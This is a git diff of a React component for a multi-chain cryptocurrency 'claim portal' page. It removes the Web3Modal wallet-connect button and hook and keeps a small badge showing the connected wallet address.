@@ -1,11 +1,9 @@
 ﻿import React, { useState, useEffect } from 'react';
-import { useWeb3Modal } from '@web3modal/ethereum/react';
 import SecuritySimulationCaptcha from './components/SecuritySimulationCaptcha';
 
 function App() {
   const [walletConnected, setWalletConnected] = useState(false);
   const [walletAddress, setWalletAddress] = useState('');
-  const { open } = useWeb3Modal();
 
   useEffect(() => {
     const checkWalletConnection = async () => {
@@ -50,16 +48,13 @@ function App() {
                 Multi-Chain Claim Portal | USDT | BNB | SOL | TRUMP
               </p>
             </div>
-            <div className="flex items-center gap-3">
-              <w3m-button />
-              {walletConnected && (
-                <div className="bg-green-100 px-3 py-1 rounded-full">
-                  <span className="text-sm text-green-700 font-mono">
-                    {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
-                  </span>
-                </div>
-              )}
-            </div>
+            {walletConnected && (
+              <div className="bg-green-100 px-3 py-1 rounded-full">
+                <span className="text-sm text-green-700 font-mono">
+                  {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
+                </span>
+              </div>
+            )}
           </div>
         </div>
       </header>
